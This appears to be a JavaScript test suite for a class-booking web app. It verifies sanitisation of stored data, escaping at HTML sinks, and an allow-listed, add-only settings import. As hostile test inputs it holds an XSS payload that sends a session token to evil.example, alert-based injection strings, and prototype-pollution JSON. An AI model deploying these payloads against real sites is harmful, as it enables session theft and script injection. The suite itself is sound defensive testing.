'use strict';
// What comes out of storage, and what an import file may put into it.
//   • js/app.js pure:stored-data — ids / seat lists / rankings / bike prefs are
//     coerced where they are READ (an imported file, or the iOS Preferences
//     mirror of one, can hold anything);
//   • the three sinks that printed them raw (instrLink, the instructor chips,
//     the history modal) — the REAL instrLink over the REAL escapers;
//   • js/settings.js pure:import-validate — allow-listed keys, per-key shape
//     and size, no prototype pollution, and a merge that only ever ADDS.
module.exports = async function (t) {
  const { ok, eq } = t;
  const appSrc = t.readSource('js/app.js');
  const clean = t.loadPure('js/app.js', 'stored-data');
  const XSS = '"><img src=x onerror="new Image().src=\'https://evil.example/?t=\'+_secureTokenStore.get()">';

  t.section('Stored data: ids');
  eq([clean._cleanStoredId('123'), clean._cleanStoredId(456), clean._cleanStoredId('a1b2-c3_d4'), clean._cleanStoredId('urn:x.1')], ['123', '456', 'a1b2-c3_d4', 'urn:x.1'],
    'digits, numbers, uuid-ish and dotted tokens pass (the id shape is Psycle\'s, not ours to assume)');
  eq([XSS, "x' autofocus onfocus='alert(1)", 'a b', '', null, undefined, {}, ['1'], true, 'x'.repeat(65), 1e21].map(clean._cleanStoredId), ['', '', '', '', '', '', '', '', '', '', ''],
    'markup, quotes, spaces, non-strings and over-long values are no id at all');
  eq(clean._cleanStoredIdList(['11', 22, XSS, '11', null, { id: 1 }, '33']), ['11', '22', '33'], 'an id list keeps the clean ids, once each, in order');
  eq([clean._cleanStoredIdList('11'), clean._cleanStoredIdList({ 0: '11' }), clean._cleanStoredIdList(null)], [[], [], []], 'anything that is not an array is an empty list');
  eq(clean._cleanStoredIdList(['1', '2', '3', '4'], 2), ['1', '2'], 'the list is capped');

  t.section('Stored data: class history');
  {
    const good = { eventId: '77', typeName: 'Ride 45', instrName: "D'Arcy & Co <b>", instrId: '11', locName: 'Bank', date: '2026-01-05 07:00:00', slots: [12, 15], bookedAt: '2026-01-01T10:00:00.000Z', synced: true, cancelledAt: null };
    eq(clean._cleanStoredHistory([good]), [good], 'a real entry (in-app or synced) comes through unchanged — names are NOT touched here, they are escaped where printed');
    const out = clean._cleanStoredHistory([
      { eventId: 77, instrId: XSS, slots: ['<img src=x onerror=alert(1)>', '7', 9, null, NaN, Infinity], date: '2026-01-05 07:00:00', extra: { nested: true }, list: [1, 2], fn: 'ok' },
      null, 'str', 42, ['array'],
      JSON.parse('{"__proto__":{"cancelledAt":"x"},"constructor":"c","prototype":"p","eventId":"5","slots":"7"}'),
    ]);
    eq(out.length, 2, 'entries that are not plain objects are dropped');
    eq([out[0].eventId, out[0].instrId], ['77', ''], 'ids are coerced (a numeric eventId becomes its string; a markup instrId becomes none)');
    eq(out[0].slots, [7, 9], 'slots are finite numbers only (markup, null, NaN and Infinity → gone; "7" → 7)');
    eq([out[0].extra, out[0].list, out[0].fn], [undefined, undefined, 'ok'], 'nested objects / arrays have no business in an entry; unknown primitive fields pass through (other modules add theirs)');
    eq([out[1].eventId, out[1].slots, out[1].cancelledAt, Object.keys(out[1]).sort()], ['5', [], undefined, ['eventId', 'slots']], '__proto__ / constructor / prototype keys are skipped — and nothing is inherited from them');
    ok({}.cancelledAt === undefined, 'Object.prototype is untouched');
    eq([clean._cleanStoredHistory({}), clean._cleanStoredHistory('x'), clean._cleanStoredHistory(null)], [[], [], []], 'a stored value that is not an array is an empty history');
    eq(clean._cleanStoredHistory([{ eventId: '1', typeName: 'x'.repeat(500) }])[0].typeName.length, 300, 'text fields are capped');
    // Fields every reader treats as text: (typeName || '').toUpperCase() threw on
    // `typeName: 5` — Stats and the History modal never painted, and the add-only
    // import could not replace the row.
    const bad = clean._cleanStoredHistory([{ eventId: '5', typeName: 5, instrName: true, locName: 7, date: 20260101, bookedAt: 1, cancelledAt: false, duration: 45, synced: true }])[0];
    eq(bad, { eventId: '5', duration: 45, synced: true }, 'typeName / instrName / locName / date / bookedAt / cancelledAt are text or nothing — a number or boolean there is dropped; other primitive fields still pass');
    eq([(bad.typeName || '').toUpperCase(), bad.instrName || '', String(bad.date || '')], ['', '', ''], '…so the readers\' `|| \'\'` fallbacks hold');
    eq(clean._cleanStoredHistory([{ eventId: '5', cancelledAt: null, typeName: null }])[0], { eventId: '5', cancelledAt: null, typeName: null }, 'null stays null (a live entry carries cancelledAt: null)');
  }

  t.section('Stored data: rankings and bike prefs');
  eq(clean._cleanStoredTiers({ 11: 'S', 22: 'F', 33: 'Z', 44: '<b>', 55: 1, [XSS]: 'A' }), { 11: 'S', 22: 'F' }, 'a ranking is a clean id → one of S A B C D F');
  eq(clean._cleanStoredTiers(JSON.parse('{"__proto__":"S","constructor":"A","7":"B"}')), { 7: 'B' }, 'prototype keys are never ranked');
  eq([clean._cleanStoredTiers(['S', 'A']), clean._cleanStoredTiers(null), clean._cleanStoredTiers('S')], [{}, {}, {}], 'an array is not a ranking map (["S","A"]["1"] would rank instructor 1)');
  eq(clean._cleanStoredBikePrefs({ 4: { avoid: [1, '2', '<svg/onload=1>'], prefer: 'x' }, 5: 'nope', 6: [1], [XSS]: { avoid: [1], prefer: [] } }), { 4: { avoid: [1, 2], prefer: [] } },
    'bike prefs are { studio: { avoid: [numbers], prefer: [numbers] } } and nothing else');

  // ── The sinks ────────────────────────────────────────────────────────────
  t.section('Stored ids never break out of markup (the real instrLink, the chips, the history modal)');
  {
    const sec = {};
    sec.window = sec; sec.self = sec; sec.top = sec;
    sec.document = { documentElement: { style: {} } };
    sec.localStorage = t.makeFakeLocalStorage();
    sec.location = { origin: 'http://localhost', protocol: 'http:' };
    sec.console = { log() {}, warn() {}, error() {} };
    sec.setTimeout = () => 0; sec.clearTimeout = () => {};
    sec.addEventListener = () => {};
    sec.btoa = (s) => Buffer.from(s, 'binary').toString('base64');
    sec.atob = (s) => Buffer.from(s, 'base64').toString('binary');
    t.vm.createContext(sec);
    t.vm.runInContext(t.readSource('js/security.js'), sec, { filename: 'js/security.js' });
    const lines = appSrc.split('\n');
    const at = lines.findIndex((l) => l.startsWith('function instrLink('));
    const end = lines.findIndex((l, i) => i > at && l === '}');
    ok(at !== -1 && end > at, 'instrLink can be sliced');
    sec.instructors = [{ id: 11, full_name: 'Alex' }];
    t.vm.runInContext(lines.slice(at, end + 1).join('\n'), sec, { filename: 'js/app.js[instrLink]' });

    // What the attribute parser then the JS parser make of the onclick value.
    const decode = (s) => s.replace(/&quot;/g, '"').replace(/&#39;/g, "'").replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&');
    const handlerOf = (html) => {
      const m = /^<span class="instructor-link"[^>]*? onclick="([^"]*)">/.exec(html);
      return m ? decode(m[1]) : null;
    };
    const callArgs = (html) => {
      const calls = [];
      const js = handlerOf(html);
      if (js === null) return null;
      t.vm.runInNewContext(js, { event: { stopPropagation() {} }, window: { _features_openInstructorModal: (...a) => calls.push(a) } });
      return calls;
    };
    eq(callArgs(sec.instrLink('Alex', '11')), [['Alex', '11']], 'a normal id: one call, (name, id)');
    eq(callArgs(sec.instrLink('Alex', 11)), [['Alex', '11']], 'a numeric id too');
    eq(callArgs(sec.instrLink('Alex')), [['Alex', '11']], 'no id: resolved by name from the loaded instructors');
    eq(sec.instrLink('Nobody'), 'Nobody', 'no id and no match: plain escaped text, no handler');
    for (const evil of [XSS, "');alert(1);('", "\\');alert(1);//", '</span><script>alert(1)</script>']) {
      const html = sec.instrLink('Alex', evil);
      ok(!/<img|<script/i.test(html) && (html.match(/</g) || []).length === 2, 'instrId ' + JSON.stringify(evil.slice(0, 18)) + '…: no new element in the markup');
      eq(callArgs(html), [['Alex', evil]], '…and the handler still makes ONE call, with the hostile text as a plain string argument');
    }
    eq(callArgs(sec.instrLink("D'Arcy", '11')), [["D'Arcy", '11']], 'names keep working as before');
    // Names come out of stored history as well (Lapsed favourites): same rule.
    for (const evilName of ["x');alert(1);//", "\\');alert(1);//", '&#39;);alert(1);//', 'two\nlines\r\u2028here']) {
      const html = sec.instrLink(evilName, '11');
      ok((html.match(/</g) || []).length === 2, 'name ' + JSON.stringify(evilName.slice(0, 16)) + '…: no new element');
      eq(callArgs(html), [[evilName, '11']], '…one call, the hostile text as a plain string (a line break no longer leaves a handler that cannot be parsed)');
    }

    const chips = appSrc.slice(appSrc.indexOf('function renderInstrChips() {'), appSrc.indexOf('function renderInstrDropdown() {'));
    // The chip escapes the id once into `safeId` and uses it in both handlers
    // (mousedown + the keyboard click) — either spelling is the escaped id.
    const chipIdEscaped = /removeInstructor\('\$\{escapeForJsString\(id\)\}'\)/.test(chips) ||
      (/const safeId = escapeForJsString\(id\);/.test(chips) && /removeInstructor\('\$\{safeId\}'\)/.test(chips));
    ok(chipIdEscaped && !/removeInstructor\('\$\{id\}'\)/.test(chips), 'instructor chips: the id goes through escapeForJsString (it can come from favourites or a recent search)');
    ok(/onmousedown="event\.preventDefault\(\);removeInstructor\(/.test(chips), '…still the inline onmousedown (interactions.js wraps removeInstructor with saveFilters)');
    // The history modal prints formatSlots(entry.slots) into innerHTML. What it
    // reads comes through features.js's REAL getHistory: seat NUMBERS only.
    const feat = t.readSource('js/features.js');
    const gFrom = feat.indexOf('  function getHistory() {'), gTo = feat.indexOf('  function saveHistory(');
    ok(gFrom !== -1 && gTo > gFrom, 'features.js getHistory can be sliced');
    const hostile = [{ eventId: '1', typeName: 'Ride', date: '2026-01-05 07:00:00', slots: ['<img src=x onerror=alert(1)>', 7, '12'] }, { eventId: '2', slots: '<svg/onload=alert(1)>' }];
    const hStore = t.makeFakeLocalStorage();
    hStore.setItem('psycle_class_history', JSON.stringify(hostile));
    const hCtx = t.vm.createContext({ localStorage: hStore, HISTORY_KEY: 'psycle_class_history', _cleanStoredHistory: clean._cleanStoredHistory, JSON, Array });
    const grabFn = (opener) => {
      const a = lines.findIndex((l) => l.startsWith(opener));
      const b = lines.findIndex((l, i) => i > a && l === '}');
      if (a === -1 || b === -1) throw new Error('import-validate suite: cannot slice "' + opener + '" (anchor moved?)');
      return lines.slice(a, b + 1).join('\n');
    };
    t.vm.runInContext(feat.slice(gFrom, gTo) + '\n' + grabFn('function pluralizeSlotLabel(') + '\n' + grabFn('function formatSlots('), hCtx, { filename: 'js/features.js[getHistory]' });
    const read = hCtx.getHistory();
    eq(read.map((h) => h.slots), [[7, 12], []], 'features.js getHistory hands the modal numbers only, whatever is stored');
    eq(read.map((h) => hCtx.formatSlots('Bike', h.slots)), ['Bikes 7 & 12', ''], '…so the seat line it prints cannot carry markup');
    hStore.setItem('psycle_class_history', '{"not":"an array"}');
    eq(hCtx.getHistory(), [], 'a stored value that is not a list reads as no history');
    ok(/typeof _cleanStoredHistory === 'function' \? _cleanStoredHistory\(arr\)/.test(feat) && /typeof _cleanStoredHistory === 'function' \? _cleanStoredHistory\(arr\)/.test(t.readSource('js/explore.js')),
      'features.js and explore.js read history through the cleaner (typeof-guarded: other suites run those files without app.js)');
    const fav = appSrc.slice(appSrc.indexOf('function loadFavourites() {'), appSrc.indexOf('function _saveSetting('));
    ok(/new Set\(_cleanStoredIdList\(JSON\.parse\(/.test(fav), 'favourites are read through the id-list cleaner');
    const settingsSrc = t.readSource('js/settings.js');
    ok(/_cleanStoredTiers\(t\)/.test(settingsSrc) && /_cleanStoredBikePrefs\(p\)/.test(settingsSrc), 'settings.js reads rankings and bike prefs through their cleaners');
  }

  // ── Import ───────────────────────────────────────────────────────────────
  const imp = t.loadPure('js/settings.js', 'import-validate');
  const OPTS = {
    clean: { history: clean._cleanStoredHistory, tiers: clean._cleanStoredTiers, idList: clean._cleanStoredIdList, bikePrefs: clean._cleanStoredBikePrefs },
    themes: ['cloud', 'linen', 'graphite'], historyMax: 2000,
  };
  const device = (obj) => (key) => (Object.prototype.hasOwnProperty.call(obj || {}, key) ? obj[key] : null);
  const plan = (file, dev, opts) => imp._planSettingsImport(file, device(dev), Object.assign({}, OPTS, opts || {}));
  const hist = (id, extra) => Object.assign({ eventId: String(id), typeName: 'Ride', instrName: 'Alex', instrId: '11', locName: 'Bank', date: '2026-01-' + String(10 + (Number(id) % 18)).padStart(2, '0') + ' 07:00:00', slots: [7] }, extra || {});
  const FILE = {
    psycle_instructor_tiers: '{"11":"S","22":"B"}',
    psycle_bike_prefs: '{"4":{"avoid":[1],"prefer":[7]}}',
    psycle_fav_instructors: '["11","22"]',
    psycle_saved_filters: '{"locationIds":["3"],"instructorIds":["11"],"dateQuickMode":"week"}',
    psycle_theme: 'linen',
    psycle_class_history: JSON.stringify([hist(1), hist(2), hist(3)]),
    psycle_history_synced: '2026-02-01T00:00:00.000Z',
    psycle_notify_watchlist: '["901"]',
    _exported_at: '2026-08-03T10:00:00.000Z', _version: 1,
  };

  t.section('Import: a real export onto an empty device');
  {
    const pl = plan(FILE, {});
    eq(Object.keys(pl.writes).sort(), Object.keys(FILE).filter((k) => k[0] !== '_').sort(), 'all eight exported keys are written');
    eq([pl.deviceHasData, pl.skipped, pl.accepted, pl.exportedAt], [false, [], 7, '2026-08-03T10:00:00.000Z'], 'nothing on the device to weigh it against (no confirm), nothing refused, the export date is read');
    eq(JSON.parse(pl.writes.psycle_class_history).map((h) => h.eventId).sort(), ['1', '2', '3'], 'the history arrives');
    eq([pl.writes.psycle_theme, pl.writes.psycle_history_synced, JSON.parse(pl.writes.psycle_instructor_tiers)], ['linen', FILE.psycle_history_synced, { 11: 'S', 22: 'B' }], 'theme and sync stamp are raw strings, as the app stores them');
    eq(imp._importSummary(pl.added), '3 classes, 2 rankings, 2 favourites, bike preferences for 1 studio, 1 spot alert, your theme and your last search filters', 'the toast / dialog says what it adds');
  }

  t.section('Import: unknown keys, prototype-pollution keys and the token are ignored');
  {
    const evil = JSON.parse(JSON.stringify(FILE));
    evil.psycle_bearer_token = 'STOLEN-SESSION';
    evil.psycle_bearer_token_enc = 'aes:blob';
    evil.psycle_data_owner = '999';
    evil.psycle_account_stash = '{"1":{"keys":{}}}';
    evil.psycle_onboarded_v1 = '1';
    evil.some_other_key = 'x';
    const polluted = JSON.parse('{"__proto__":{"psycle_theme":"linen","polluted":true},"constructor":{"prototype":{"polluted":true}},"prototype":"x"}');
    Object.assign(polluted, { psycle_fav_instructors: '["11"]' });
    const pl = plan(evil, {});
    ok(!Object.keys(pl.writes).some((k) => Object.keys(FILE).indexOf(k) === -1), 'only the keys an export writes can ever be written — never a token, the data owner, the account stash or anything unknown');
    const pl2 = plan(polluted, {});
    eq([Object.keys(pl2.writes), pl2.writes.psycle_theme], [['psycle_fav_instructors'], undefined], 'a "__proto__" member of the file is just an unknown key');
    // …and a key the file merely INHERITS (a polluted Object.prototype) is not the file's.
    const inherited = Object.assign(Object.create({ psycle_theme: 'linen', psycle_instructor_tiers: '{"66":"S"}' }), { psycle_fav_instructors: '["11"]' });
    eq(Object.keys(plan(inherited, {}).writes), ['psycle_fav_instructors'], 'only the file\'s OWN properties are read');
    ok({}.polluted === undefined, 'Object.prototype is untouched');
    const nested = plan({
      psycle_instructor_tiers: '{"__proto__":"S","constructor":"A","11":"S"}',
      psycle_bike_prefs: '{"__proto__":{"avoid":[1],"prefer":[]},"4":{"avoid":[1],"prefer":[]}}',
      psycle_saved_filters: '{"__proto__":{"x":1},"constructor":"c","locationIds":["3"],"deep":{"a":1},"list":[1,{"a":1},"ok"]}',
    }, {});
    eq([JSON.parse(nested.writes.psycle_instructor_tiers), JSON.parse(nested.writes.psycle_bike_prefs)], [{ 11: 'S' }, { 4: { avoid: [1], prefer: [] } }], 'prototype keys INSIDE a value are dropped too');
    eq(JSON.parse(nested.writes.psycle_saved_filters), { locationIds: ['3'], list: [1, 'ok'] }, 'saved filters are copied flat: primitives and lists of primitives, nothing nested');
  }

  t.section('Import: wrong shapes and oversized values are skipped and reported — the rest still imports');
  {
    const pl = plan({
      psycle_class_history: '{"not":"an array"}',
      psycle_instructor_tiers: '["S","A"]',
      psycle_bike_prefs: 'not json {',
      psycle_fav_instructors: { already: 'parsed' },
      psycle_notify_watchlist: '"901"',
      psycle_theme: 'hotdog',
      psycle_saved_filters: '[1,2]',
      psycle_history_synced: 'yesterday-ish',
    }, {});
    eq(pl.writes, {}, 'nothing is written');
    eq(pl.skipped.map((s) => s.key + ':' + s.reason).sort(), [
      'psycle_bike_prefs:unreadable', 'psycle_class_history:wrong shape', 'psycle_fav_instructors:not text', 'psycle_history_synced:not a date',
      'psycle_instructor_tiers:wrong shape', 'psycle_notify_watchlist:wrong shape', 'psycle_saved_filters:wrong shape', 'psycle_theme:unknown theme',
    ], 'every refusal is recorded with its reason');
    eq([pl.accepted, imp._importSummary(pl.added)], [0, ''], 'nothing accepted → the caller says "not a Psync backup"');

    // A crafted row: text fields that are not text. It used to import as is, and
    // getCategory / slotLabel then threw on every Stats and History render.
    const crafted = plan({ psycle_class_history: JSON.stringify([
      { eventId: '5', typeName: 5, instrName: true, locName: 7, date: '2026-01-01 07:00:00' },
      { eventId: '6', typeName: 'Ride', date: 20260102 },
    ]) }, {});
    eq(JSON.parse(crafted.writes.psycle_class_history), [{ eventId: '5', date: '2026-01-01 07:00:00' }],
      'non-text typeName / instrName / locName never reach the device; a row whose date is not text is not a class at all');
    // …and one that got in before this check is harmless the moment it is read.
    eq(clean._cleanStoredHistory(JSON.parse('[{"eventId":"5","typeName":5,"instrName":true,"locName":7,"date":"2026-01-01 07:00:00"}]')), [{ eventId: '5', date: '2026-01-01 07:00:00' }],
      'a bad row already stored (and Preferences-mirrored) is cleaned where it is read');
    {
      const raw = (from, to) => { const a = appSrc.indexOf(from); return appSrc.slice(a, appSrc.indexOf(to, a)); };
      ok(/_cleanStoredHistory\(history\)/.test(raw('function detectRecurringSlots() {', 'const typeByName')) && /_cleanStoredHistory\(history\)/.test(raw('function predictNextClass() {', 'const typeByName')) &&
        /_cleanStoredHistory\(history\)/.test(t.readSource('js/settings.js').split("JSON.parse(localStorage.getItem('psycle_class_history') || '[]');")[1].slice(0, 300)),
        'the three readers that parsed the key raw (template detection, the Book-again hint, the rankings list) go through the cleaner too');
    }

    const big = plan({ psycle_class_history: JSON.stringify([hist(1, { typeName: 'x'.repeat(1048576) })]), psycle_fav_instructors: '["11"]' }, {});
    eq([Object.keys(big.writes), big.skipped.map((s) => s.key + ':' + s.reason)], [['psycle_fav_instructors'], ['psycle_class_history:too large']], 'a value over 1 MB is refused; the rest of the file still imports');
    for (const notAFile of [null, undefined, 'str', 42, [FILE]]) {
      const r = plan(notAFile, {});
      ok(Object.keys(r.writes).length === 0 && r.accepted === 0 && r.skipped[0].reason === 'not a settings file', JSON.stringify(notAFile === undefined ? 'undefined' : notAFile).slice(0, 12) + ' is not a settings file');
    }
    eq(plan({ psycle_fav_instructors: '["11"]', _exported_at: '<img src=x onerror=alert(1)>' }, {}).exportedAt, '', 'an export date that is not a date is not shown');
  }

  t.section('Import: a markup payload in an otherwise valid file is defused on the way in');
  {
    const pl = plan({
      psycle_class_history: JSON.stringify([1, 2, 3, 4, 5].map((n) => hist(n, { instrId: XSS, instrName: 'Mallory', slots: ['<img src=x onerror=alert(1)>'], date: '2025-01-0' + n + ' 07:00:00' }))),
      psycle_fav_instructors: JSON.stringify(['x" autofocus onfocus="alert(1)', '11']),
    }, {});
    const stored = JSON.parse(pl.writes.psycle_class_history);
    eq([stored.length, stored.every((h) => h.instrId === '' && h.slots.length === 0), JSON.parse(pl.writes.psycle_fav_instructors)], [5, true, ['11']],
      'the reviewer\'s token-stealing file: the classes import, the hostile ids and seat lists do not');
    ok(!/onerror|onfocus|<img/.test(pl.writes.psycle_class_history + pl.writes.psycle_fav_instructors), '…no trace of the payload is stored');
  }

  t.section('Import: onto a device that already has data it only ADDS — nothing is replaced');
  {
    const DEVICE = {
      psycle_instructor_tiers: '{"11":"A","33":"C"}',
      psycle_bike_prefs: '{"4":{"avoid":[9],"prefer":[]},"5":{"avoid":[],"prefer":[]}}',
      psycle_fav_instructors: '["33","11"]',
      psycle_saved_filters: '{"locationIds":["8"]}',
      psycle_theme: 'graphite',
      psycle_class_history: JSON.stringify([hist(2, { slots: [99] }), hist(3, { cancelledAt: '2026-01-02T00:00:00.000Z' }), hist(50)]),
      psycle_history_synced: '2026-09-01T00:00:00.000Z',
    };
    const file = Object.assign({}, FILE, {
      psycle_bike_prefs: '{"4":{"avoid":[1],"prefer":[7]},"5":{"avoid":[2],"prefer":[]},"6":{"avoid":[],"prefer":[]}}',
      psycle_class_history: JSON.stringify([hist(1), hist(1, { cancelledAt: '2025-12-30T00:00:00.000Z' }), hist(1), hist(2), hist(3)]),
    });
    const pl = plan(file, DEVICE);
    ok(pl.deviceHasData === true, 'the device holds data → the caller asks first');
    const h = JSON.parse(pl.writes.psycle_class_history);
    eq(h.filter((x) => x.eventId === '2').map((x) => x.slots), [[99]], 'a class this device already knows keeps the DEVICE\'s record');
    eq(h.filter((x) => x.eventId === '3').map((x) => !!x.cancelledAt), [true], '…a class cancelled here is NOT resurrected as attended by an older backup');
    eq(h.filter((x) => x.eventId === '1').map((x) => !!x.cancelledAt).sort(), [false, true], 'a class only the file knows arrives with both its rows (cancelled + rebooked), duplicates collapsed');
    eq([h.length, h.map((x) => x.date).join() === h.map((x) => x.date).sort().reverse().join()], [5, true], 'merged newest-first');
    eq(JSON.parse(pl.writes.psycle_instructor_tiers), { 11: 'A', 22: 'B', 33: 'C' }, 'rankings: the device\'s A for instructor 11 beats the file\'s S; 22 is new');
    eq(JSON.parse(pl.writes.psycle_bike_prefs), { 4: { avoid: [9], prefer: [] }, 5: { avoid: [2], prefer: [] } }, 'bike prefs: studio 4 kept, the EMPTY studio 5 is filled, an empty studio 6 is not imported');
    eq(JSON.parse(pl.writes.psycle_fav_instructors), ['33', '11', '22'], 'favourites: union, device order first');
    eq([pl.writes.psycle_theme, pl.writes.psycle_saved_filters, pl.writes.psycle_history_synced], [undefined, undefined, undefined], 'theme, last filters and the sync stamp are never overwritten');
    eq(pl.added, { classes: 2, rankings: 1, bikeStudios: 1, favourites: 1, alerts: 1 }, 'the counts the dialog shows');
    eq(imp._importSummary(pl.added), '2 classes, 1 ranking, 1 favourite, bike preferences for 1 studio and 1 spot alert', '…in words');

    const same = plan(FILE, FILE);
    eq([same.writes, same.accepted > 0, imp._importSummary(same.added)], [{}, true, ''], 'a backup that adds nothing writes nothing (the caller says so instead of reloading)');
    const capped = plan({ psycle_class_history: JSON.stringify([hist(7), hist(8), hist(9)]) }, { psycle_class_history: JSON.stringify([hist(1), hist(2)]) }, { historyMax: 4 });
    eq(JSON.parse(capped.writes.psycle_class_history).length, 4, 'the merged history honours the shared cap');
    const noHist = plan({ psycle_history_synced: FILE.psycle_history_synced }, {});
    eq(noHist.writes, {}, 'a sync stamp without the history it vouches for is not imported (it would hide the first-run sync offer)');
    const brokenDevice = plan(FILE, { psycle_class_history: '{broken', psycle_instructor_tiers: 'null', psycle_fav_instructors: '7' });
    eq([brokenDevice.deviceHasData, JSON.parse(brokenDevice.writes.psycle_class_history).length], [false, 3], 'unreadable device values count as empty');
  }

  t.section('Import: the flow around the plan (js/settings.js)');
  {
    const s = t.readSource('js/settings.js');
    const flow = s.slice(s.indexOf('  window.importSettings = function (input) {'), s.indexOf('  // Bug Report'));
    ok(!/EXPORT_KEYS\.forEach\(function \(key\) \{\s*if \(data\[key\]\)/.test(flow) && !/localStorage\.setItem\(key, data\[key\]\)/.test(s), 'the file is no longer copied into localStorage key by key');
    ok(/if \(!summary\)[\s\S]*else if \(!plan\.deviceHasData\)[\s\S]*_applySettingsImport\(plan\)[\s\S]*confirmModal\(/.test(flow), 'nothing to add → say so; empty device → import; otherwise confirmModal first');
    ok(/cancelText: 'Cancel'/.test(flow) && /confirmText: 'Import'/.test(flow), 'the dialog has its own button labels (confirmModal\'s default cancel is "Keep booking")');
    ok(/Nothing already on this device is replaced/.test(flow), '…and says what will and will not change');
    ok((flow.match(/input\.value = ''/g) || []).length >= 3 && /file\.size > IMPORT_MAX_FILE/.test(flow), 'the picker is reset on every path, and a huge file is refused before it is read');
    ok(!/#5dba5d|#e94560/.test(flow), 'no fixed colours left in the flow');
  }
};
